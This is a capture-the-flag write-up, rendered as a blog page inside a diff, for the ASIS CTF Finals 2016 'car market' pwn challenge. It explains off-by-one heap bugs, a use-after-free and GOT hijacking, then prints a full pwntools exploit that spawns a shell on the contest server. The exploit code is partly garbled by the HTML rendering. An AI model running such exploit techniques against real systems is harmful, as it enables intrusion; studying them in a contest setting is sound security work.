@@ -1,0 +1,797 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.13.0 by Michael Rose
+  Copyright 2013-2018 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE.txt
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>ASIS CTF Finals 2016 – car market - Hacking Tube 2.0</title>
+<meta name="description" content="Category: pwnPoints: 177">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Hacking Tube 2.0">
+<meta property="og:title" content="ASIS CTF Finals 2016 – car market">
+<meta property="og:url" content="http://0.0.0.0:4000/asis-ctf-finals-2016-car-market/">
+
+
+  <meta property="og:description" content="Category: pwnPoints: 177">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2016-09-13T16:54:00+08:00">
+
+
+
+
+
+
+<link rel="canonical" href="http://0.0.0.0:4000/asis-ctf-finals-2016-car-market/">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Hacking Tube 2.0 Feed">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if lte IE 9]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    <div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        <a class="site-title" href="/">Hacking Tube 2.0</a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about" >About</a>
+            </li><li class="masthead__menu-item">
+              <a href="/archives/" >Archive</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle Menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="http://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/other/gravatar.png" alt="Bruce Chen" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Bruce Chen</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Vulnerability researcher / CTFer
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="http://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Taiwan</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://twitter.com/bruce30262"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+          
+        
+          
+            <li><a href="https://github.com/bruce30262"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="http://schema.org/CreativeWork">
+    <meta itemprop="headline" content="ASIS CTF Finals 2016 – car market">
+    <meta itemprop="description" content="Category: pwnPoints: 177">
+    <meta itemprop="datePublished" content="September 13, 2016">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">ASIS CTF Finals 2016 – car market
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p><strong>Category:</strong> pwn
+<strong>Points:</strong> 177</p>
+
+<!-- more -->
+
+<p>64 bit ELF, with <strong>Partial RELRO, Canary &amp; NX enabled, no PIE</strong>. <code class="highlighter-rouge">libc.so</code> was provided.</p>
+
+<p>The binary is a car market program. It will let us list our cars’ info, add a car, remove a car and select a car. By selecting a car, we can edit our car model, price and add a customer. While adding a customer, we can set the customer’s name, comment and print out the customer’s info. The <code class="highlighter-rouge">car</code> and <code class="highlighter-rouge">customer</code> are defined as the following structures:<br />
+```c car
+struct car{
+  char model[16];
+  long price;
+  struct customer* customer;
+};</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>```c customer  
+struct customer{
+  char first_name[32];
+  char name[32];
+  char* comment; // buffer size: 0x48
+};
+</code></pre></div></div>
+
+<p>After doing some reversing &amp; fuzzing, here’s some important program behavior:</p>
+
+<ul>
+  <li>There’s a pointer <code class="highlighter-rouge">struct car** ptr</code>. The program will first use <code class="highlighter-rouge">malloc</code> to allocate a buffer and assigned to <code class="highlighter-rouge">ptr</code>, which use the buffer to store the <code class="highlighter-rouge">car*</code> array.</li>
+  <li>Each time we add a customer to a car, the program will first check if <code class="highlighter-rouge">car-&gt;customer</code> and <code class="highlighter-rouge">car-&gt;customer-&gt;comment</code> were exist in the car. If it does, the program will free <code class="highlighter-rouge">car-&gt;customer</code> and <code class="highlighter-rouge">car-&gt;customer-&gt;comment</code>, ensure that there’s only one customer in the car.</li>
+  <li>There exist multiple <strong>off-by-one</strong> vulnerabilities while the program try to read the user input. When we input the <code class="highlighter-rouge">model</code>, <code class="highlighter-rouge">first_name</code> and the <code class="highlighter-rouge">name</code> data, we can trigger the vulnerability by entering a long length data. <strong>This will cause the first byte of the next data be overwritten to a null byte.</strong></li>
+</ul>
+
+<p>The first thing I try to do is to leak some address. I found that if we do the following operation, we can leak heap’s base address:</p>
+
+<ol>
+  <li>Enter the customer menu</li>
+  <li>Exit the customer menu</li>
+  <li>Enter the customer menu again</li>
+  <li>Print out the customer info, the customer’s first name will become a heap address</li>
+</ol>
+
+<p>This is because the program will try to free the memory of <code class="highlighter-rouge">car-&gt;customer</code> before we try to enter the customer menu for the second time. After <code class="highlighter-rouge">car-&gt;customer</code> was freed, its memory chunk’s fd (<strong>which is also <code class="highlighter-rouge">car-&gt;customer-&gt;first_name</code></strong>) will be storing the next free chunk’s address, so by printing out the customer’s info , we can leak out the heap’s address.</p>
+
+<p>The next thing is to leak out the libc’s address. To achieve this, I decide to corrupted fastbin by exploiting the off-by-one vulnerability. Assume that we have the following memory layout of a <code class="highlighter-rouge">car-&gt;customer</code> structure:</p>
+<pre>
+             +------------------+
+customer     |........first_name| char first_name[32]
+             |..................|
+             |..................|
+             |..................|
+             +------------------+
+customer+32  |..............name| char name[32]
+             |..................|
+             |..................|
+             |..................|
+             +------------------+
+customer+64  |        0x12345680| char* comment
+             +------------------+
+</pre>
+
+<p>By using the off-by-one vulnerability on <code class="highlighter-rouge">car-&gt;customer-&gt;name</code>, <strong>we can overwrite the last byte of <code class="highlighter-rouge">comment</code>’s address, change it from <code class="highlighter-rouge">0x12345680</code> to <code class="highlighter-rouge">0x12345600</code></strong>. Now if we exit &amp; re-enter the customer menu, the program will try to free <code class="highlighter-rouge">car-&gt;customer-&gt;comment</code>, which is <code class="highlighter-rouge">0x12345600</code> instead of <code class="highlighter-rouge">0x12345680</code>.</p>
+
+<p>Now if we have the memory layout of a <code class="highlighter-rouge">car</code> structure like this:</p>
+<pre>  
+                      +------------------+
+    car    0x123455F0 |               0x0| char model[16]
+                      +------------------+
+                      |              0x51|
+                      +------------------+
+    car+16 0x12345600 |              0x64| long price
+                      +------------------+
+    car+24 0x12345608 |        0x12348880| struct customer* customer
+                      +------------------+
+</pre>
+
+<p>By setting the model of the car, we can fake the chunk’s header, so when glibc’s freeing <code class="highlighter-rouge">0x12345600</code>, it will think that it is freeing a memory chunk with the size of <code class="highlighter-rouge">0x50</code>, <strong>the same size as <code class="highlighter-rouge">car-&gt;customer-&gt;comment</code></strong>, and add <code class="highlighter-rouge">0x12345600</code> into fastbin. This will create an <strong>Use-After-Free</strong> situation, with <code class="highlighter-rouge">0x12345600</code> being a dangling pointer. The next time we create a customer comment, the program will allocate <code class="highlighter-rouge">0x12345600</code> as the comment buffer, <strong>and thus we can modify the structure of <code class="highlighter-rouge">car</code>, changing the <code class="highlighter-rouge">car-&gt;customer</code> pointer to <code class="highlighter-rouge">atoi</code>’s GOT</strong>. After that, we can leak <code class="highlighter-rouge">atoi</code>’s GOT by printing the <code class="highlighter-rouge">car</code>’s info.</p>
+
+<p>To summarize, the following steps will help us leak out the libc’s address:</p>
+
+<ol>
+  <li>Add a couple of cars, try to make a <code class="highlighter-rouge">car</code>’s address ends with the <code class="highlighter-rouge">0xf0</code> byte (ex. <code class="highlighter-rouge">0x123455f0</code>), and put the fake chunk header in <code class="highlighter-rouge">car-&gt;model</code>.</li>
+  <li>Exploit the off-by-one vulnerability, overwrite a <code class="highlighter-rouge">comment</code>’s buffer address. (ex. <code class="highlighter-rouge">0x12345680</code> -&gt; <code class="highlighter-rouge">0x12345600</code>)</li>
+  <li>Exit &amp; re-enter the customer menu, so the program will free the fake <code class="highlighter-rouge">comment</code>’s address.</li>
+  <li>Create a new <code class="highlighter-rouge">comment</code>, the new <code class="highlighter-rouge">comment</code>’s buffer will be overlapped with one of those <code class="highlighter-rouge">car</code>’s memory chunk.</li>
+  <li>Edit <code class="highlighter-rouge">comment</code> and modify the <code class="highlighter-rouge">car</code>’s structure, change the <code class="highlighter-rouge">car-&gt;customer</code> pointer to <code class="highlighter-rouge">atoi</code>’s GOT.</li>
+  <li>Print out the <code class="highlighter-rouge">car</code>’s info, leak <code class="highlighter-rouge">atoi</code>’s GOT and get the libc’s address.</li>
+</ol>
+
+<p>Now we have the libc’s address. Since the GOT entries are writable, we can try to overwrite <code class="highlighter-rouge">atoi</code>’s GOT into <code class="highlighter-rouge">system</code>’s address and do the GOT hijacking. At first I try to overwrite the GOT by using the same method as I leak <code class="highlighter-rouge">atoi</code>’s GOT – after we change the <code class="highlighter-rouge">customer</code> pointer, we can overwrite the GOT entry by modifying <code class="highlighter-rouge">customer-&gt;first_name</code>.</p>
+
+<p>Except we can’t. That’s because when we try to do so, the program will try to free <code class="highlighter-rouge">car-&gt;customer</code> before we enter the customer menu, <strong>and doing <code class="highlighter-rouge">free(atoi@got.plt)</code> will crash the program</strong>. We’ll have to find another way to overwrite the GOT. So how are we gonna do that? Well, <strong>remember the <code class="highlighter-rouge">ptr</code> variable?</strong> The pointer that points to the <code class="highlighter-rouge">car*</code> array?</p>
+
+<p>Since we can modify a <code class="highlighter-rouge">car</code>’s structure by editing the comment, we can once again modify <code class="highlighter-rouge">car-&gt;customer</code>, changing the pointer to <code class="highlighter-rouge">ptr</code>, so when the program free <code class="highlighter-rouge">car-&gt;customer</code>, <strong>it will free the whole <code class="highlighter-rouge">car*</code> array instead.</strong> When the next time we create a new comment, it will allocate the memory by splitting the memory chunk from <code class="highlighter-rouge">ptr</code>, <strong>making us able to control the <code class="highlighter-rouge">car*</code> array.</strong> We can then overwrite the <code class="highlighter-rouge">car</code> pointer into <code class="highlighter-rouge">atoi</code>’s GOT by editing the comment. Once the <code class="highlighter-rouge">car</code> pointer is changed, we can overwrite the content by setting <code class="highlighter-rouge">car-&gt;model</code>, and that’s how we hijack <code class="highlighter-rouge">atoi</code>’s GOT.</p>
+
+<p>So after we leak the libc’s address:</p>
+
+<ol>
+  <li>Edit <code class="highlighter-rouge">comment</code> and modify the <code class="highlighter-rouge">car</code>’s structure, change the <code class="highlighter-rouge">car-&gt;customer</code> pointer to <code class="highlighter-rouge">ptr</code>.</li>
+  <li>Exit &amp; re-enter the customer menu, so the program will free the fake <code class="highlighter-rouge">car-&gt;customer</code>’s address.</li>
+  <li>Create a new <code class="highlighter-rouge">comment</code>, the new <code class="highlighter-rouge">comment</code>’s buffer will be overlapped with the <code class="highlighter-rouge">car*</code> array.</li>
+  <li>Edit <code class="highlighter-rouge">comment</code> and modify the <code class="highlighter-rouge">car</code> pointer, change it to <code class="highlighter-rouge">atoi</code>’s GOT.</li>
+  <li>Overwrite <code class="highlighter-rouge">atoi</code>’s GOT to <code class="highlighter-rouge">system</code>’s address by setting <code class="highlighter-rouge">car-&gt;model</code>.</li>
+</ol>
+
+<p>At last, when the program ask us to input our choice, we can input <code class="highlighter-rouge">sh\x00</code> and execute <code class="highlighter-rouge">system('sh')</code>, spawning a shell and get the flag…right?</p>
+
+<p>```python exp_car.py
+#!/usr/bin/env python</p>
+
+<p>from pwn import *
+import subprocess
+import sys
+import time</p>
+
+<p>HOST = “car-market.asis-ctf.ir”
+PORT = 31337
+ELF_PATH = “./car_market”
+#LIBC_PATH = “/lib/x86_64-linux-gnu/libc.so.6”
+LIBC_PATH = “./car_libc.so.6”</p>
+
+<h1 id="setting">setting</h1>
+<p>context.arch = ‘amd64’
+context.os = ‘linux’
+context.endian = ‘little’
+context.word_size = 32
+context.log_level = ‘INFO’</p>
+
+<p>elf = ELF(ELF_PATH)
+libc = ELF(LIBC_PATH)</p>
+
+<p>def add_car(model, price):
+    r.sendlineafter(“&gt;\n”, “2”)
+    r.sendlineafter(“model\n”, model)
+    r.sendlineafter(“price\n”, str(price))</p>
+
+<p>def sel_car_cust(idx, cust_zip):
+    r.sendlineafter(“&gt;\n”, “4”)
+    r.sendlineafter(“index\n”, str(idx))
+    r.sendlineafter(“&gt;\n”, “4”)</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>for (choice, data) in cust_zip:
+    r.sendlineafter("&gt;\n", str(choice))
+    r.sendlineafter(": \n", data)
+
+r.sendlineafter("&gt;\n", "4") # exit cust mode
+</code></pre></div></div>
+
+<p>def leak_heap(idx):
+    r.sendlineafter(“&gt;\n”, “4”)
+    r.sendlineafter(“index\n”, str(idx))
+    r.sendlineafter(“&gt;\n”, “4”) # add cust
+    r.sendlineafter(“&gt;\n”, “3”) # add com
+    r.sendlineafter(“: \n”, “123”) # input com
+    r.sendlineafter(“&gt;\n”, “4”) # exit cust
+    r.sendlineafter(“&gt;\n”, “4”) # add cust
+    r.sendlineafter(“&gt;\n”, “4”) # exit cust
+    r.sendlineafter(“&gt;\n”, “1”) # list
+    r.recvuntil(“Firstname : “)
+    heap_base = u64(r.recvline().strip().ljust(8, “\x00”)) - 0xb90
+    r.sendlineafter(“&gt;\n”, “5”)</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>return heap_base
+</code></pre></div></div>
+
+<p>def leak_got(idx):
+    r.sendlineafter(“&gt;\n”, “4”)
+    r.sendlineafter(“index\n”, str(idx))
+    r.sendlineafter(“&gt;\n”, “1”)
+    r.recvuntil(“Firstname : “)
+    atoi_addr = u64(r.recv(6).ljust(8, “\x00”))
+    log.success(“atoi_addr: “+hex(atoi_addr))
+    libc.address += atoi_addr - libc.symbols[‘atoi’]
+    r.sendlineafter(“&gt;\n”, “5”)</p>
+
+<p>if <strong>name</strong> == “<strong>main</strong>”:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">r</span> <span class="p">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+<span class="p">#</span><span class="n">r</span> <span class="p">=</span> <span class="n">process</span><span class="p">(</span><span class="n">ELF_PATH</span><span class="p">)</span>
+
+<span class="n">for</span> <span class="n">i</span> <span class="k">in</span> <span class="n">xrange</span><span class="p">(</span><span class="m">17</span><span class="p">):</span>
+    <span class="k">model</span> <span class="p">=</span> <span class="n">chr</span><span class="p">(</span><span class="n">ord</span><span class="p">(</span><span class="s2">"a"</span><span class="p">)+</span><span class="n">i</span><span class="p">)*</span><span class="m">4</span>
+    <span class="n">price</span> <span class="p">=</span> <span class="m">100</span><span class="p">+</span><span class="n">i</span>
+    <span class="nb">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"add car: "</span><span class="p">+</span><span class="n">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+    <span class="k">if</span> <span class="n">i</span> <span class="p">==</span> <span class="m">15</span><span class="p">:</span> <span class="p">#</span> <span class="n">fake</span> <span class="n">chunk</span>
+        <span class="k">model</span> <span class="p">=</span> <span class="n">p64</span><span class="p">(</span><span class="m">0</span><span class="p">)</span> <span class="p">+</span> <span class="n">p64</span><span class="p">(</span><span class="m">0x51</span><span class="p">)</span>
+        <span class="n">price</span> <span class="p">=</span> <span class="m">0x1111</span>
+    <span class="n">add_car</span><span class="p">(</span><span class="k">model</span><span class="p">,</span> <span class="n">price</span><span class="p">)</span>
+
+<span class="p">#</span> <span class="n">leak</span> <span class="n">heap</span> <span class="n">base</span>
+<span class="nb">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"leaking heap base..."</span><span class="p">)</span>
+<span class="n">heap_base</span> <span class="p">=</span> <span class="n">leak_heap</span><span class="p">(</span><span class="m">16</span><span class="p">)</span>
+<span class="nb">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s2">"heap_base: "</span><span class="p">+</span><span class="n">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">))</span>
+
+<span class="p">#</span> <span class="n">overflow</span> <span class="n">one</span> <span class="n">byte</span> <span class="k">of</span> <span class="n">heap</span> <span class="n">address</span>
+<span class="nb">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"overflowing heap address..."</span><span class="p">)</span>
+<span class="n">choice</span> <span class="p">=</span> <span class="p">[</span><span class="m">3</span><span class="p">,</span> <span class="m">1</span><span class="p">]</span>
+<span class="n">data</span>   <span class="p">=</span> <span class="p">[</span><span class="s2">"comment"</span><span class="p">,</span> <span class="s2">"A"</span><span class="p">*</span><span class="m">33</span><span class="p">]</span>
+<span class="n">sel_car_cust</span><span class="p">(</span><span class="m">16</span><span class="p">,</span> <span class="n">zip</span><span class="p">(</span><span class="n">choice</span><span class="p">,</span> <span class="n">data</span><span class="p">))</span>   
+
+<span class="p">#</span> <span class="n">add</span> <span class="n">comment</span> <span class="k">and</span> <span class="n">overwrite</span> <span class="n">customer</span> <span class="n">pointer</span><span class="p">,</span> <span class="n">change</span> <span class="n">it</span> <span class="k">to</span> <span class="n">atoi</span><span class="p">@</span><span class="n">got</span><span class="p">.</span><span class="n">plt</span>
+<span class="nb">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"modifying car 15 struct (for leaking got)..."</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">"&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"4"</span><span class="p">)</span> <span class="p">#</span> <span class="n">add</span> <span class="n">customer</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">"&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"3"</span><span class="p">)</span> <span class="p">#</span> <span class="n">add</span> <span class="n">comment</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">": </span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="m">0x1111</span><span class="p">)</span> <span class="p">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s1">'atoi'</span><span class="p">]))</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">"&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"4"</span><span class="p">)</span> <span class="p">#</span> <span class="k">exit</span> <span class="n">customer</span> <span class="n">menu</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">"&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"5"</span><span class="p">)</span> <span class="p">#</span> <span class="k">exit</span> <span class="n">select</span> <span class="n">car</span> <span class="n">menu</span>
+
+<span class="p">#</span> <span class="n">leak</span> <span class="n">atoi</span><span class="s1">'s got
+log.info("leaking atoi'</span><span class="n">s</span> <span class="n">got</span> <span class="p">&amp;</span> <span class="n">libc</span> <span class="n">base</span><span class="p">...</span><span class="s2">")
+leak_got(15)
+system = libc.symbols['system']
+log.success("</span><span class="n">libc</span> <span class="n">base</span><span class="p">:</span> <span class="s2">"+hex(libc.address))
+log.success("</span><span class="nf">system</span><span class="p">:</span> <span class="s2">"+hex(system))
+
+# overwrite customer pointer to heap_base+0x10
+log.info("</span><span class="n">modifying</span> <span class="n">car</span> <span class="m">15</span> <span class="n">struct</span> <span class="p">(</span><span class="n">for</span> <span class="n">corrupting</span> <span class="n">car</span> <span class="k">array</span><span class="p">)...</span><span class="s2">")
+choice = [3]
+data   = [p64(0x1111) + p64(heap_base+0x10)]
+sel_car_cust(16, zip(choice, data))   
+r.sendlineafter("</span><span class="p">&gt;\</span><span class="n">n</span><span class="s2">", "</span><span class="m">5</span><span class="s2">") # exit select car menu
+
+# free &amp; reallocate heap_base+0x10 , now we can control the car array 
+# after we control the car array, overite car[14] and make it point to atoi's got
+log.info("</span><span class="n">modifying</span> <span class="n">car</span> <span class="k">array</span><span class="p">...</span><span class="s2">")
+choice = [3]
+data   = ["</span><span class="n">A</span><span class="s2">"*0x20+p64(elf.got['atoi'])]
+sel_car_cust(15, zip(choice, data))   
+r.sendlineafter("</span><span class="p">&gt;\</span><span class="n">n</span><span class="s2">", "</span><span class="m">5</span><span class="s2">") # exit select car menu
+
+# overwrite atoi's got
+log.info("</span><span class="n">overwriting</span> <span class="n">atoi</span><span class="s1">'s got...")
+r.sendlineafter("&gt;\n", "4") # select car
+r.sendlineafter("index\n", "14") # input index
+r.sendlineafter("&gt;\n", "2") # set model (atoi'</span><span class="n">s</span> <span class="n">got</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">"model</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="nf">system</span><span class="p">))</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"sh\x00"</span><span class="p">)</span>
+
+<span class="nb">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s2">"get shell !"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  
+After I finished the exploit, I found it once again, the exploit has timeout due to the crappy internet connection. So I upload the exploit to trello and ask **freetsubasa** if she can send the payload for me. And then she told me that **she had the shell spawned, but she can't find the flag.** What ?  
+</code></pre></div></div>
+<p>$ ls -la
+total 40
+drwxr-x— 2 root marketpwn  4096 Sep  8 10:02 .
+drwxr-xr-x 3 root root       4096 Sep  8 09:51 ..
+lrwxrwxrwx 1 root marketpwn     9 Sep  8 09:59 .bash_history -&gt; /dev/null
+-rw-r–r– 1 root marketpwn   220 Sep  8 09:51 .bash_logout
+-rw-r–r– 1 root marketpwn  3771 Sep  8 09:51 .bashrc
+-rwxr-xr-x 1 root marketpwn 10504 Sep  8 09:56 car_market
+-r–r—– 1 root marketpwn    39 Sep  8 09:57 ._flag
+-rw-r–r– 1 root marketpwn   655 Sep  8 09:51 .profile
+-rwxr-xr-x 1 root marketpwn   104 Sep  8 09:56 wrapper.sh</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>OK, so the ASIS organizer try to play some trick on us. It's alright, no big deal, just give us the flag so we can pass the challenge.  
+</code></pre></div></div>
+<p>$ cat ._flag
+cat: ._flag: No such file or directory
+```
+WHAT. THE. F*CK.</p>
+
+<p>How is this even possible? The file is just right there and now you’re telling me the file does not exist? This is bullsh*t !@#$%^&amp;</p>
+
+<p>So after we have the shell, we spent another 30 minutes trying to figure out how to read the god damn flag. After some trial &amp; error, teammate <strong>ddaa</strong> finally get the flag by using the <code class="highlighter-rouge">cat .*</code> command. It’s strange because I’ve tried <code class="highlighter-rouge">for f in .*;do cat $f;done</code> and it failed, don’t know why <strong>:/</strong></p>
+
+<p>Anyway we finally got the flag and the 177 points. The binary itself was a great challenge, but the command line one was kind of evil <strong>-.-</strong></p>
+
+<p>flag: <code class="highlighter-rouge">ASIS{a0b8813fc566836c8b5f37fe68c684c5}</code></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#asis" class="page__taxonomy-item" rel="tag">ASIS</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#ctf" class="page__taxonomy-item" rel="tag">CTF</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#heap" class="page__taxonomy-item" rel="tag">heap</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#off-by-one" class="page__taxonomy-item" rel="tag">off-by-one</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pwnable" class="page__taxonomy-item" rel="tag">Pwnable</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#python" class="page__taxonomy-item" rel="tag">Python</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#use-after-free" class="page__taxonomy-item" rel="tag">use_after_free</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#write-ups" class="page__taxonomy-item" rel="tag">write-ups</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2016-09-13T16:54:00+08:00">September 13, 2016</time></p>
+        
+      </footer>
+
+      <!-- /usr/gem/gems/minimal-mistakes-jekyll-4.13.0/_includes/social-share.html -->
+<!-- Remove linkdin shared button -->
+<section class="page__share">
+  
+
+  <a href="https://twitter.com/intent/tweet?text=ASIS+CTF+Finals+2016+--+car+market%20http%3A%2F%2F0.0.0.0%3A4000%2Fasis-ctf-finals-2016-car-market%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2F0.0.0.0%3A4000%2Fasis-ctf-finals-2016-car-market%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://plus.google.com/share?url=http%3A%2F%2F0.0.0.0%3A4000%2Fasis-ctf-finals-2016-car-market%2F" class="btn btn--google-plus" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Google Plus"><i class="fab fa-fw fa-google-plus" aria-hidden="true"></i><span> Google+</span></a>
+
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/mma-2nd-ctf-2016-interpreter/" class="pagination--pager" title="MMA 2nd CTF 2016 – Interpreter
+">Previous</a>
+    
+    
+      <a href="/869100/" class="pagination--pager" title="ASIS CTF Finals 2016 – shadow
+">Next</a>
+    
+  </nav>
+
+    </div>
+
